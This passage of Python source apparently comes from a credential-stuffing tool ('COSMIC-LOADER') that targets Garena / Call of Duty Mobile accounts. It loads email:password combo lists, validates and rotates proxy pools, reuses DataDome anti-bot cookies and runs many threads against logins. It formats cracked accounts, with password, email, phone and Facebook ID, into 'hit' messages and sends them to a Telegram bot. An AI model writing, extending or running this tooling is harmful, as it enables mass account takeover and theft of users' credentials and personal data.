                    valid_urls = _validate_proxies_bulk(parsed_urls, timeout=timeout, max_workers=workers, indent=indent)
                    _close_check_session()
                    print()

                    if not valid_urls:
                        _err("No proxies passed validation. Proxies disabled.")
                        proxy_manager = ProxyManager(enabled=False)
                    else:
                        save_text = (
                            Text("Save working proxies back to file?\n\n", style="bold bright_white") +
                            Text("  [Y]  ", style="bold green") + Text("Yes – overwrite file with working proxies only\n", style="dim") +
                            Text("  [N]  ", style="bold yellow") + Text("No  – use working proxies this session only", style="dim")
                        )
                        _panel(save_text)
                        save_back = _ask("Save back? (Y/n): ").lower()

                        if save_back in ("", "y", "yes"):
                            try:
                                Path(file_input).write_text("\n".join(valid_urls) + "\n", encoding="utf-8")
                                _ok(f"Saved [cyan]{len(valid_urls)}[/cyan] proxies to '[cyan]{file_input}[/cyan]'.")
                            except Exception as e:
                                _warn(f"Could not write file: {e}")

                        proxy_manager = ProxyManager(enabled=True)
                        proxy_manager.proxies = valid_urls
                        _ok(f"Loaded [cyan]{len(valid_urls)}[/cyan] validated proxies.")
                else:
                    proxy_manager = ProxyManager(enabled=True)
                    proxy_manager.proxies = parsed_urls
                    _ok(f"Loaded [cyan]{len(parsed_urls)}[/cyan] proxies (validation skipped).")

    else:
        proxy_manager = ProxyManager(enabled=False)
        _warn("Proxies disabled. Running direct.")

    _close_check_session()
    print()
    input(indent + "Press Enter to continue...")

_proxy_check_local = threading.local()

def _get_check_session() -> requests.Session:
    if not hasattr(_proxy_check_local, "session"):
        s = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=1,
            pool_maxsize=1,
            max_retries=0,
            pool_block=False
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        _proxy_check_local.session = s
    return _proxy_check_local.session

def _close_check_session() -> None:
    if hasattr(_proxy_check_local, "session"):
        try:
            _proxy_check_local.session.close()
        except Exception:
            pass
        del _proxy_check_local.session

def _parse_proxy_line(raw: str) -> str | None:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    if re.match(r"^(https?|socks[45])://", raw, re.IGNORECASE):
        parsed = urllib.parse.urlparse(raw)
        if parsed.hostname and parsed.port:
            return raw
        return None
    if "@" in raw:
        return "http://" + raw
    parts = raw.split(":")
    if len(parts) == 2 and parts[1].isdigit():
        return f"http://{parts[0]}:{parts[1]}"
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit():
            host, port, user, pw = a, b, c, d
        elif d.isdigit():
            user, pw, host, port = a, b, c, d
        else:
            return None
        return f"http://{urllib.parse.quote(user, safe='-._~')}:{urllib.parse.quote(pw, safe='-._~')}@{host}:{port}"
    return None

def _validate_proxy(url: str, timeout: float = 5.0) -> tuple[bool, str, float]:
    try:
        parsed = urllib.parse.urlparse(url)
        proxy_host = parsed.hostname or ""
        proxy_port = parsed.port or 8080
        if not proxy_host:
            return False, "no_host", -1.0
        raw_user = urllib.parse.unquote(parsed.username or "")
        raw_pass = urllib.parse.unquote(parsed.password or "")
    except Exception:
        return False, "parse_err", -1.0

    proxy_auth = None
    if raw_user:
        credentials = f"{raw_user}:{raw_pass}".encode()
        proxy_auth = f"Basic {base64.b64encode(credentials).decode()}"

    last_err = "dead"
    sock = None

    for target_host, target_port, target_path in [
        ("ip-api.com", 80, "/json/?fields=query,status"),
        ("api.ipify.org", 80, "/?format=json")
    ]:
        sock = None
        try:
            t0 = time.monotonic()
            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
            sock.settimeout(timeout)

            req_lines = [
                f"GET http://{target_host}{target_path} HTTP/1.1",
                f"Host: {target_host}",
                "Accept: application/json",
                "Connection: close"
            ]
            if proxy_auth:
                req_lines.append(f"Proxy-Authorization: {proxy_auth}")

            sock.sendall("\r\n".join(req_lines + ["", ""]).encode())

            data = b""
            while len(data) < 4096:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\r\n\r\n" in data and len(data) > 200:
                    break

            latency_ms = (time.monotonic() - t0) * 1000
            status_line = data.decode(errors="replace").split("\r\n", 1)[0] if data else ""
            parts = status_line.split(" ", 2)
            status_code = int(parts[1]) if len(parts) >= 2 and parts[1].isdigit() else 0

            if status_code == 200:
                body = data.decode(errors="replace").split("\r\n\r\n", 1)[-1].strip()
                if body and body[0] in "0123456789abcdefABCDEF":
                    body = body.split("\r\n", 1)[-1].split("\r\n")[0].strip()
                try:
                    jdata = json.loads(body)
                    ip = str(jdata.get("query") or jdata.get("ip") or "?").split(",")[0].strip()
                    return True, ip, latency_ms
                except Exception:
                    return True, "alive(no-ip)", latency_ms

            if status_code == 407:
                last_err = "auth_failed(407)"
            elif status_code in (401, 403):
                last_err = f"auth_denied({status_code})"
            elif status_code:
                last_err = f"http_{status_code}"

        except socket.timeout:
            last_err = "connect_timeout"
        except ConnectionRefusedError:
            last_err = "connection_refused"
            break
        except socket.gaierror:
            last_err = "dns_fail"
            break
        except Exception as e:
            last_err = type(e).__name__
        finally:
            if sock is not None:
                try:
                    sock.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    sock.close()
                except Exception:
                    pass
                sock = None

    if last_err not in ("auth_failed(407)", "auth_denied(403)", "auth_denied(401)", "dns_fail", "connection_refused"):
        sock = None
        try:
            t0 = time.monotonic()
            sock = socket.create_connection((proxy_host, proxy_port), timeout=timeout)
            latency_ms = (time.monotonic() - t0) * 1000
            return True, f"alive(no-ip,{last_err})", latency_ms
        except Exception:
            pass
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass
                sock = None

    return False, last_err, -1.0

def _display_proxy_quality(valid_count, total_count, avg_latency_ms, indent="    "):
    if not total_count:
        return

    sr = (valid_count / total_count) * 100

    if sr >= 50 and 0 < avg_latency_ms <= 1500:
        tier, tc, bar_color = "HIGH",   "bold bright_green", "bright_green"
        icon, rec, note     = "🟢",     "up to 20",          "Proxies are fast and reliable. Push thread count high."
    elif sr >= 30 or (0 < avg_latency_ms <= 2500):
        tier, tc, bar_color = "MEDIUM", "bold yellow",        "yellow"
        icon, rec, note     = "🟡",     "8 – 12",             "Acceptable pool. Balance threads to avoid timeouts."
    else:
        tier, tc, bar_color = "LOW",    "bold red",            "red"
        icon, rec, note     = "🔴",     "3 – 5",              "Pool is weak. Low threads reduce wasted retries."

    lat   = f"{avg_latency_ms:.0f} ms" if avg_latency_ms > 0 else "N/A"
    BW    = 24

    def _bar(pct, width=BW, color="bright_green"):
        filled = int(pct / 100 * width)
        return (
            f"[{color}]{'█' * filled}[/{color}]"
            f"[dim]{'░' * (width - filled)}[/dim]"
        )

    def _lat_bar(ms, width=BW):
        if ms <= 0:
            return f"[dim]{'░' * width}[/dim]"
        capped = min(ms, 3000)
        filled = int(capped / 3000 * width)
        color  = "bright_green" if ms <= 800 else "yellow" if ms <= 1800 else "red"
        return (
            f"[{color}]{'█' * filled}[/{color}]"
            f"[dim]{'░' * (width - filled)}[/dim]"
        )

    lat_hint = (
        "[bright_green]Excellent[/bright_green]" if 0 < avg_latency_ms <= 800  else
        "[yellow]Acceptable[/yellow]"             if avg_latency_ms <= 1800     else
        "[red]Slow[/red]"                         if avg_latency_ms > 1800      else
        "[dim]N/A[/dim]"
    )

    table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
    table.add_column(style="dim", width=22)
    table.add_column(style="white", width=36)

    table.add_row(
        "  Quality Tier",
        f"[{tc}]{icon}  {tier}[/{tc}]"
    )
    table.add_row("", "")
    table.add_row(
        "  Success Rate",
        f"[bold]{sr:.1f}%[/bold]  [dim]({valid_count:,} / {total_count:,})[/dim]"
    )
    table.add_row("", _bar(sr, color=bar_color))
    table.add_row("", "")
    table.add_row(
        "  Avg Latency",
        f"[bold]{lat}[/bold]  [dim]{lat_hint}[/dim]"
    )
    table.add_row("", _lat_bar(avg_latency_ms))
    table.add_row("", "")
    table.add_row(
        "  Rec. Threads",
        f"[bold bright_cyan]{rec}[/bold bright_cyan]"
    )
    table.add_row(
        "  Advice",
        f"[dim]{note}[/dim]"
    )

    console.print()
    console.print(Panel(
        table,
        title=f"[bold bright_white] PROXY QUALITY REPORT [/bold bright_white]",
        subtitle=f"[{tc}] {tier} TIER [/{tc}]",
        border_style=bar_color,
        padding=(1, 2),
        expand=False
    ))
    console.print()

def _validate_proxies_bulk(urls: list[str], timeout: float = 5.0, max_workers: int = 500, indent: str = "    ") -> list[str]:
    total = len(urls)
    workers = min(max_workers, max(total, 1))
    valid = []
    invalid = []
    latencies = []
    lock = threading.Lock()
    start_time = time.monotonic()

    progress = Progress(
        SpinnerColumn(),
        TextColumn("[bold bright_cyan]Validating"),
        BarColumn(bar_width=30),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        MofNCompleteColumn(),
        TextColumn("│ [green]{task.fields[valid]}✔[/green] [red]{task.fields[invalid]}✖[/red]"),
        TimeElapsedColumn(),
        TextColumn("ETA"),
        TimeRemainingColumn(),
        console=console,
        refresh_per_second=12
    )

    with progress:
        task = progress.add_task(
            "Validating",
            total=total,
            valid=0,
            invalid=0
        )

        def _check_one(url: str) -> None:
            ok, _, lat = _validate_proxy(url, timeout=timeout)
            with lock:
                if ok:
                    valid.append(url)
                    if lat > 0:
                        latencies.append(lat)
                else:
                    invalid.append(url)
                progress.update(
                    task,
                    completed=len(valid) + len(invalid),
                    valid=len(valid),
                    invalid=len(invalid)
                )

        def _wrapped_check(url: str) -> None:
            try:
                _check_one(url)
            finally:
                _close_check_session()

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(_wrapped_check, u) for u in urls]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    pass

    _close_check_session()

    avg_speed = total / max(time.monotonic() - start_time, 0.001)
    console.print(f"\n{indent}  [bold green]✔ Valid: {len(valid):,}[/bold green]   [bold red]✖ Dead: {len(invalid):,}[/bold red]   [dim]│  ~{avg_speed:.0f}/s[/dim]")

    avg_lat = (sum(latencies) / len(latencies)) if latencies else -1.0
    _display_proxy_quality(len(valid), total, avg_lat, indent)

    return valid

def _format_tg_hit_message(ad: dict) -> str:
    """Format a hit as a modern, clean HTML Telegram message."""
    is_clean = ad.get("is_clean", False)
    header_icon = "✅" if is_clean else "🔥"
    header_text = "CLEAN CODM HIT" if is_clean else "CODM HIT FOUND"
    
    region_raw = ad.get("codm_region", "N/A")
    region_fmt = format_codm_region(region_raw) if region_raw != "N/A" else "N/A"
    
    status_icon = "✅" if is_clean else "⚠️"
    status_text = "Clean" if is_clean else "Not Clean"

    acc = html.escape(str(ad.get('account','N/A')))
    pwd = html.escape(str(ad.get('password','N/A')))
    uid = ad.get('uid','N/A')
    uname = html.escape(str(ad.get('username','N/A')))
    level = ad.get('codm_level','N/A')
    ign = html.escape(str(ad.get('codm_nickname','N/A')))
    c_uid = ad.get('codm_uid','N/A')
    shell = ad.get('shell_balance', 0)
    email = html.escape(str(ad.get('email_display','N/A')))
    mobile = html.escape(str(ad.get('formatted_mobile','N/A')))
    fb = html.escape(str(ad.get('fb_info','N/A')))
    
    fb_uid = str(ad.get('fb_uid', 'N/A'))
    if fb_uid and fb_uid != 'N/A':
        fb_link_url = f"https://graph.facebook.com/v3.2/{fb_uid}/picture?width=200&height=200"
        fb_link_line = f"   🔗 <b>FB Link:</b> <a href=\"{fb_link_url}\">{fb_link_url}</a>"
    else:
        fb_link_line = "   🔗 <b>FB Link:</b> <code>N/A</code>"

    lines = [
        f"{header_icon} <b>{header_text}</b> {header_icon}",
        "",
        "📋 <b>ACCOUNT INFO</b>",
        f"   🔑 <b>Login:</b> <code>{acc}</code>",
        f"   🔒 <b>Pass:</b> <code>{pwd}</code>",
        f"   🆔 <b>UID:</b> <code>{uid}</code>",
        f"   👤 <b>User:</b> <code>{uname}</code>",
        "",
        "🎮 <b>CODM PROFILE</b>",
        f"   ⭐ <b>Level:</b> <code>{level}</code>",
        f"   🌍 <b>Server:</b> {region_fmt}",
        f"   🎯 <b>IGN:</b> <code>{ign}</code>",
        f"   🆔 <b>C-UID:</b> <code>{c_uid}</code>",
        "",
        "💎 <b>RESOURCES &amp; SECURITY</b>",
        f"   💎 <b>Shells:</b> <code>{shell:,}</code>",
        f"   📧 <b>Email:</b> <code>{email}</code>",
        f"   📱 <b>Mobile:</b> <code>{mobile}</code>",
        f"   📘 <b>FB:</b> <code>{fb}</code>",
        fb_link_line,
        f"   🔐 <b>Status:</b> {status_icon} <b>{status_text}</b>",
        "",
        "━━━━━━━━━━━━━━━━━━━━",
        "🤖 <i>Powered by @LEGITCosmicDev x @LEGITCosmicDev2nd</i>",
    ]
    return "\n".join(lines)



# ══════════════════════════════════════════════════════════════════════════
#  CHECKPOINT — Resume from interrupted scans
# ══════════════════════════════════════════════════════════════════════════
_CHECKPOINT_FILE = Path("Results/_scan_checkpoint.json")
_CHECKPOINT_LOCK = threading.Lock()


def _checkpoint_save(file_path, processed_index, total, stats=None):
    """Save scan progress."""
    try:
        _CHECKPOINT_FILE.parent.mkdir(exist_ok=True)
        with _CHECKPOINT_LOCK:
            with open(_CHECKPOINT_FILE, "w", encoding="utf-8") as f:
                json.dump({
                    "file": str(file_path),
                    "index": processed_index,
                    "total": total,
                    "timestamp": datetime.now().isoformat(),
                    "stats": stats or {},
                }, f, indent=2)
    except Exception:
        pass


def _checkpoint_load(file_path):
    """Load previous progress if same file."""
    try:
        if not _CHECKPOINT_FILE.exists():
            return None
        with _CHECKPOINT_LOCK:
            with open(_CHECKPOINT_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        if data.get("file") == str(file_path):
            return data
    except Exception:
        pass
    return None


def _checkpoint_clear():
    try:
        if _CHECKPOINT_FILE.exists():
            _CHECKPOINT_FILE.unlink()
    except Exception:
        pass


def bulk_check():
    clear_screen()
    display_banner()
    file_manager = AccountFileManager()
    file_viewer = AccountFileViewer()
    combo_files = file_manager.scan_combo_folder()
    if not combo_files:
        clear_screen()
        display_banner()
        w = 66
        print()
        print(f"  {_A_ERROR}┏{'━' * w}┓{_A_RST}")
        print(f"  {_A_ERROR}┃{_A_RST}{_A_BOLD}{_A_BRIGHT}{'⚠  NO COMBO FILES FOUND'.center(w)}{_A_RST}{_A_ERROR}┃{_A_RST}")
        print(f"  {_A_ERROR}┣{'━' * w}┫{_A_RST}")
        print(f"  {_A_ERROR}┃{_A_RST}  {_A_DIM}Add .txt files to:{_A_RST}")
        print(f"  {_A_ERROR}┃{_A_RST}  {_A_BRIGHT}/storage/emulated/0/COSMIC-LOADER-v4.0/Combo/{_A_RST}")
        print(f"  {_A_ERROR}┃{_A_RST}")
        print(f"  {_A_ERROR}┃{_A_RST}  {_A_DIM}Format: email:password{_A_RST}")
        print(f"  {_A_ERROR}┗{'━' * w}┛{_A_RST}")
        print()
        input(f"  {_A_DIM}Press Enter to continue...{_A_RST} ")
        return
    file_infos = [info for fp in combo_files for info in [file_manager.get_file_info(fp)] if info]
    if not file_infos:
        _log('ERROR', 'No valid combo files found.')
        return
    file_viewer.display_file_table(file_infos)
    selected_file = file_viewer.prompt_file_selection(file_infos)
    if file_viewer.prompt_clean_file():
        with console.status('[bright_cyan]  ↺  Cleaning file encoding…[/bright_cyan]', spinner='dots'):
            valid_count, invalid_count = file_manager.clean_file_encoding(selected_file)
        _log('SUCCESS', f'Cleaned: [bold]{valid_count}[/bold] valid, [bright_red]{invalid_count}[/bright_red] removed')
    if file_viewer.prompt_remove_duplicates():
        with console.status('[bright_cyan]  ↺  Removing duplicates…[/bright_cyan]', spinner='dots'):
            removed = file_manager.clean_duplicates(selected_file)
        _log('SUCCESS', f'Removed [bold]{removed}[/bold] duplicate(s)')
    auto_remove = file_viewer.prompt_auto_remove_checked()
    if auto_remove:
        _log('INFO', '[dim]Auto-remove enabled.[/dim]')
    prompt_proxy_setup()
    if not proxy_manager or not proxy_manager.enabled:
        _log('INFO', '[dim]Running without proxies (direct connection)[/dim]')
    else:
        _log('SUCCESS', f'[dim]Proxy enabled — {len(proxy_manager.proxies)} proxies loaded[/dim]')
    clear_screen()
    display_banner()
    
    # 1. Load done-ledger for resumption
    done_set = set()
    if _DONE_LEDGER.exists():
        with open(_DONE_LEDGER, 'r', encoding='utf-8') as f:
            done_set = set(line.strip() for line in f if line.strip())
            
    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as file:
            for line in file:
                account, password = clean_account_line(line)
                if account and password:
                    accounts.append(f'{account}:{password}')
                    
        pending_accounts = [a for a in accounts if a not in done_set]
        if len(done_set) > 0:
            _log('INFO', f'Resuming: [bold]{len(pending_accounts):,}[/bold] pending ([dim]{len(done_set):,} already done[/dim])')
            
        file_table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
        file_table.add_column(style='dim', width=12, no_wrap=True)
        file_table.add_column(style='bright_white', no_wrap=True)
        file_table.add_row('File', f'[bright_cyan]{Path(selected_file).name}[/bright_cyan]')
        file_table.add_row('Accounts', f'[bold bright_white]{len(pending_accounts):,}[/bold bright_white]')
        console.print(Panel(file_table, title='[bold bright_green]✔ FILE LOADED[/bold bright_green]', border_style='bright_green', box=CARD, padding=(0, 2), expand=False, width=60))
    except Exception:
        _log('ERROR', 'Could not read file.')
        return
    if not pending_accounts:
        _log('SUCCESS', 'All accounts in this file have already been processed!')
        return
        
    info_table = Table(show_header=False, box=None, padding=(0, 1), expand=False)
    info_table.add_column(style='dim', width=16, no_wrap=True)
    info_table.add_column(style='bright_white', no_wrap=True)
    info_table.add_row('Total Queued', f'[bold bright_white]{len(pending_accounts):,}[/bold bright_white]')
    info_table.add_row('Status', '[bright_green]Ready[/bright_green]')
    console.print(Panel(info_table, title='[bold bright_cyan]ℹ ACCOUNT QUEUE[/bold bright_cyan]', border_style='bright_cyan', box=CARD, padding=(0, 2), expand=False, width=50))
    
    results_manager = ResultsManager(selected_file)
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    live_stats.total_accounts = len(pending_accounts)
    
    using_proxy = proxy_manager and proxy_manager.enabled and len(proxy_manager.proxies) > 0
    if using_proxy:
        _log('INFO', f'[dim]Using {len(proxy_manager.proxies)} proxies[/dim]')
    else:
        _log('INFO', '[dim]Direct connection (no proxies)[/dim]')
    print()
    
    def _vis_len(s: str) -> int:
        import re
        return len(re.sub(r"\033\[[0-9;]*m", "", s))
    def _make_box(color: str, width: int) -> tuple:
        top = f"  {color}┏{'━' * (width + 2)}┓{_RST}"
        divider = f"  {color}┣{'━' * (width + 2)}┫{_RST}"
        bottom = f"  {color}┗{'━' * (width + 2)}┛{_RST}"
        return top, divider, bottom
    def _box_line(color: str, content: str, width: int) -> str:
        pad = width - _vis_len(content)
        return f"  {color}┃{_RST} {content}{' ' * max(pad, 0)} {color}┃{_RST}"
        
    term_width = shutil.get_terminal_size((80, 20)).columns
    max_threads = 100 if using_proxy else 30
    width = min(max(term_width - 6, 40), 56)
    top, divider, bottom = _make_box(_CY, width)
    print(top)
    print(_box_line(_CY, f"{_BRT}{_WH}⧫  THREAD SELECTOR{_RST}", width))
    print(divider)
    print(_box_line(_CY, f"{_GN}5–15{_RST}    {_DIM}Safe{_RST}  {_DIM}(recommended){_RST}", width))
    print(_box_line(_CY, f"{_YL}17–19{_RST}   {_DIM}Medium speed{_RST}", width))
    print(_box_line(_CY, f"{_CY}23–30{_RST}  {_DIM}Fast{_RST}" if not using_proxy else f"{_CY}21–30{_RST}  {_DIM}Fast — proxy only{_RST}", width))
    print(bottom)
    print()
    while True:
        try:
            raw = input(f"  {_CY}❯{_RST} Threads 1-{max_threads} {_DIM}(default 50){_RST} {_CY}❯{_RST} ").strip()
            num_threads = 50 if not raw else int(raw)
            if 1 <= num_threads <= max_threads:
                break
            _log("ERROR", f"Enter a value between 1 and {max_threads}.")
        except ValueError:
            _log("ERROR", "Invalid input — enter a number.")
    _log("SUCCESS", f"Running with {_BRT}{num_threads}{_RST} thread(s)")
    print()
    
    global CHECK_OTHER_GAMES
    width_g = min(max(term_width - 6, 40), 60)
    top_g, divider_g, bottom_g = _make_box(_MG, width_g)
    print(top_g)
    print(_box_line(_MG, f"{_BRT}{_WH}◇  GAME CONNECTIONS{_RST}", width_g))
    print(divider_g)
    print(_box_line(_MG, f"{_WH}Check OTHER GAMES{_RST}  {_DIM}(AOV / ROV / FF / Delta Force…){_RST}", width_g))
    print(_box_line(_MG, f"{_DIM}Saves each game to separate file  ·  Adds ~1-3s per account{_RST}", width_g))
    print(bottom_g)
    print()
    CHECK_OTHER_GAMES = input(f"  {_MG}◇{_RST}  Check other games? (y/N) {_CY}❯{_RST} ").strip().lower() == "y"
    _log("SUCCESS" if CHECK_OTHER_GAMES else "INFO", "Will scan all Garena game connections" if CHECK_OTHER_GAMES else f"{_DIM}CODM only — skipping other game checks{_RST}")
    print()
    
    _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')
    def _tg_save(token, chat_id, mode, clean_range, nc_range):
        try:
            import json as _j
            with open(_TG_CFG_FILE, 'w', encoding='utf-8') as _f:
                _j.dump({'token': token, 'chat_id': chat_id, 'mode': mode, 'clean': clean_range, 'nc': nc_range}, _f)
        except Exception:
            pass
    def _tg_load():
        try:
            import json as _j
            if not os.path.exists(_TG_CFG_FILE):
                return None
            with open(_TG_CFG_FILE, 'r', encoding='utf-8') as _f:
                d = _j.load(_f)
            return d if d.get('token') and d.get('chat_id') else None
        except Exception:
            return None
    _saved_tg = _tg_load()
    width_tg = min(max(term_width - 6, 40), 54)
    top_tg, divider_tg, bottom_tg = _make_box(_YL, width_tg)
    print(top_tg)
    print(_box_line(_YL, f"{_BRT}{_WH}⬡  TELEGRAM NOTIFICATION SETUP{_RST}", width_tg))
    print(divider_tg)
    print(_box_line(_YL, f"{_WH}1{_RST}  {_YL}›{_RST}  {_DIM}Send Clean hits only{_RST}", width_tg))
    print(_box_line(_YL, f"{_WH}2{_RST}  {_YL}›{_RST}  {_DIM}Send Not-Clean hits only{_RST}", width_tg))
    print(_box_line(_YL, f"{_WH}3{_RST}  {_YL}›{_RST}  {_DIM}Send Both (clean + not-clean){_RST}", width_tg))
    print(_box_line(_YL, f"{_WH}4{_RST}  {_DIM}›  No Telegram (skip){_RST}", width_tg))
    print(bottom_tg)
    print()
    tg_choice = input(f'  {_YL}❯ (default 1) {_RST}').strip() or '1'
    while tg_choice not in ('1', '2', '3', '4'):
        tg_choice = input(f'  {_YL}❯ Enter 1-4 (default 1): {_RST}').strip() or '1'
    TG_ENABLED = tg_choice != '4'
    TG_SEND_CLEAN = tg_choice in ('1', '3')
    TG_SEND_NOTCLEAN = tg_choice in ('2', '3')
    TG_BOT_TOKEN = TG_CHAT_ID = ''
    TG_LVL_MIN_CLEAN = TG_LVL_MAX_CLEAN = TG_LVL_MIN_NOTCLEAN = TG_LVL_MAX_NOTCLEAN = 0
    TG_LVL_MAX_CLEAN = TG_LVL_MAX_NOTCLEAN = 9999
    if TG_ENABLED:
        print()
        if _saved_tg:
            width_sc = min(max(term_width - 6, 40), 80)
            top_sc, divider_sc, bottom_sc = _make_box(_GN, width_sc)
            print(top_sc)
            print(_box_line(_GN, f"{_BRT}{_WH}✔  Saved config found{_RST}", width_sc))
            print(divider_sc)
            print(_box_line(_GN, f"{_DIM}Token: {_saved_tg['token']}{_RST}", width_sc))
            print(_box_line(_GN, f"{_DIM}Chat ID: {_saved_tg['chat_id']}{_RST}", width_sc))
            print(bottom_sc)
            print()
            if input(f'  {_YL}❯ Use saved config? (Y/n){_RST}  {_YL}❯{_RST} ').strip().lower() in ('', 'y'):
                TG_BOT_TOKEN, TG_CHAT_ID = _saved_tg['token'], _saved_tg['chat_id']
                _cr, _nr = _saved_tg.get('clean', [0, 9999]), _saved_tg.get('nc', [0, 9999])
                TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = (_cr[0], _cr[1]) if TG_SEND_CLEAN else (0, 9999)
                TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = (_nr[0], _nr[1]) if TG_SEND_NOTCLEAN else (0, 9999)
                width_ok = min(max(term_width - 6, 30), 40)
                top_ok, _, bottom_ok = _make_box(_GN, width_ok)
                print(top_ok)
                print(_box_line(_GN, f"{_BRT}{_WH}✔  Using saved config{_RST}", width_ok))
                print(bottom_ok)
                print()
            else:
                _saved_tg = None
        if not _saved_tg:
            width_input = min(max(term_width - 6, 40), 50)
            top_in, _, bottom_in = _make_box(_YL, width_input)
            print(top_in)
            print(_box_line(_YL, f"{_BRT}{_WH}Enter Telegram Credentials{_RST}", width_input))
            print(bottom_in)
            print()
            TG_BOT_TOKEN = input(f'  {_YL}❯ Bot Token{_RST}  {_YL}❯{_RST} ').strip()
            TG_CHAT_ID = input(f'  {_YL}❯ Chat ID{_RST}  {_YL}❯{_RST} ').strip()
            if TG_SEND_CLEAN:
                print()
                print(f'  {_DIM}Level range for {_GN}CLEAN{_RST}{_DIM} hits — format: min-max (e.g. 50-400){_RST}')
                raw_clean = input(f'  {_GN}❯ Clean level range (Enter = all){_RST}  {_GN}❯{_RST} ').strip()
                if raw_clean and '-' in raw_clean:
                    try:
                        parts = raw_clean.split('-')
                        TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN = int(parts[0].strip()), int(parts[1].strip())
                    except Exception:
                        pass
            if TG_SEND_NOTCLEAN:
                print()
                print(f'  {_DIM}Level range for {_RD}NOT-CLEAN{_RST}{_DIM} hits — format: min-max (e.g. 1-200){_RST}')
                raw_nc = input(f'  {_RD}❯ Not-clean level range (Enter = all){_RST}  {_RD}❯{_RST} ').strip()
                if raw_nc and '-' in raw_nc:
                    try:
                        parts = raw_nc.split('-')
                        TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN = int(parts[0].strip()), int(parts[1].strip())
                    except Exception:
                        pass
            if TG_BOT_TOKEN and TG_CHAT_ID:
                _tg_save(TG_BOT_TOKEN, TG_CHAT_ID, tg_choice, [TG_LVL_MIN_CLEAN, TG_LVL_MAX_CLEAN], [TG_LVL_MIN_NOTCLEAN, TG_LVL_MAX_NOTCLEAN])
                print(f'  {_DIM}Config saved for next time.{_RST}')
        print()
        print(f'  {_GN}✔  Telegram configured.{_RST}')
        if TG_SEND_CLEAN:
            print(f'  {_DIM}Clean hits  : Level {_GN}{TG_LVL_MIN_CLEAN}–{TG_LVL_MAX_CLEAN}{_RST}')
        if TG_SEND_NOTCLEAN:
            print(f'  {_DIM}Not-clean   : Level {_RD}{TG_LVL_MIN_NOTCLEAN}–{TG_LVL_MAX_NOTCLEAN}{_RST}')
        print()
        
    def _send_tg(token, chat_id, text, silent=False):
        try:
            import requests as _req
            payload = {
                'chat_id': chat_id, 
                'text': text, 
                'parse_mode': 'HTML', 
                'disable_web_page_preview': True,
                'disable_notification': silent
            }
            _req.post(f'https://api.telegram.org/bot{token}/sendMessage', json=payload, timeout=8)
        except Exception:
            pass

    def _maybe_send_tg(account_data):
        if account_data.get('is_error') or not account_data.get('has_codm'):
            return
        is_clean = account_data.get('is_clean', False)
        lvl = account_data.get('codm_level', 0)
        
        msg = _format_tg_hit_message(account_data)
        
        if TG_ENABLED:
            if is_clean and TG_SEND_CLEAN and (TG_LVL_MIN_CLEAN <= lvl <= TG_LVL_MAX_CLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()
            elif not is_clean and TG_SEND_NOTCLEAN and (TG_LVL_MIN_NOTCLEAN <= lvl <= TG_LVL_MAX_NOTCLEAN):
                threading.Thread(target=_send_tg, args=(TG_BOT_TOKEN, TG_CHAT_ID, msg, False), daemon=True).start()

    global _TG_HOOK
    _TG_HOOK = _maybe_send_tg
    
    clear_screen()
    dashboard = BulkLiveDashboard(len(pending_accounts), max_threads=num_threads)
    
    if using_proxy and proxy_manager:
        dashboard.set_proxy_count(len(proxy_manager.proxies))
        dashboard.set_scan_mode('Bulk Scan')
    else:
        dashboard.set_proxy_count(0)
        dashboard.set_scan_mode('Bulk Scan')
        
    dashboard.start()
    overall_done = 0
    account_index_counter = [0]
    index_lock = threading.Lock()
    stats_lock = threading.Lock()
    
    global _suppress_ip_prints, _ip_block_callback
    _suppress_ip_prints = True
    def _ip_block_cb(blocked: bool):
        dashboard.set_ip_blocked(blocked)
    _ip_block_callback = _ip_block_cb
    
    _thread_local = threading.local()
    def _get_thread_resources():
        if not hasattr(_thread_local, 'session') or not hasattr(_thread_local, 'datadome'):
            _thread_local.session = _fast_session()
            _thread_local.datadome = DataDomeManager()
            _thread_local.proxy_url = None
            _thread_local.proxy_line = None
            if using_proxy and proxy_manager and proxy_manager.enabled:
                proxy = proxy_manager.get_next()
                if proxy:
                    _thread_local.session.proxies.update(proxy)
                    _thread_local.proxy_url = proxy.get('http') or proxy.get('https')
                    _thread_local.proxy_line = proxy_manager._index
                    dashboard.set_current_proxy(proxy=_thread_local.proxy_url, line=_thread_local.proxy_line)
            proxy_dict = dict(_thread_local.session.proxies) if using_proxy and proxy_manager and proxy_manager.enabled else None
            valid_cookies = cookie_manager.get_valid_cookies()
            if valid_cookies:
                combined = '; '.join(valid_cookies)
                applyck(_thread_local.session, combined)
                dd_line = valid_cookies[-1]
                if 'datadome=' in dd_line:
                    for part in dd_line.split(';'):
                        part = part.strip()
                        if part.startswith('datadome='):
                            _thread_local.datadome.set_datadome(part.split('=', 1)[1].strip())
                            break
            else:
                dd = get_datadome_cookie(_thread_local.session, proxies=proxy_dict)
                if dd:
                    _thread_local.datadome.set_datadome(dd)
        return (_thread_local.session, _thread_local.datadome)
        
    def _worker(account_line):
        if ':' not in account_line:
            return ('DONE', account_line, {})
        try:
            account, password = account_line.split(':', 1)
            account, password = account.strip(), password.strip()
            session, datadome_mgr = _get_thread_resources()
